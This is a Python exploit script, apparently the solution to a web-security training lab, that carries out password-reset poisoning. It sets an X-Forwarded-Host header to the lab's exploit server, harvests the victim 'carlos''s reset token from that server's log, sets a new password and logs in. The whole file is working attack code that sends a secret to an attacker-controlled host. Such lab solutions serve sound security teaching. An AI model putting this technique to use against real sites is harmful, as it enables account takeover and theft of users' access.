import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

response = requests.get(burp_url)
match = re.search(r"<a id='exploit-link' class='button' target='_blank' href='(https://exploit-[0-9a-f]+\.exploit-server\.net)'>", response.text)
exploit_server = match.group(1)
collab = exploit_server[8:]

reset_url = burp_url + '/forgot-password'
burp_data = {"username": "carlos"}
burp_headers = {"X-Forwarded-Host": collab}
requests.post(reset_url, headers=burp_headers, data=burp_data)

response = requests.get(exploit_server+'/log')
match = re.search(r"temp-forgot-password-token=([0-9a-z]{32})", response.text)
reset_token = match.group(1)

reset_final = burp_url + '/forgot-password?temp-forgot-password-token=' + reset_token

burp_data = {"temp-forgot-password-token": reset_token, "new-password-1": "11111111", "new-password-2": "11111111"}
requests.post(reset_final, data=burp_data)

burp_data = {"username": "carlos", "password": "11111111"}
requests.post(burp_url+ '/login', data=burp_data)
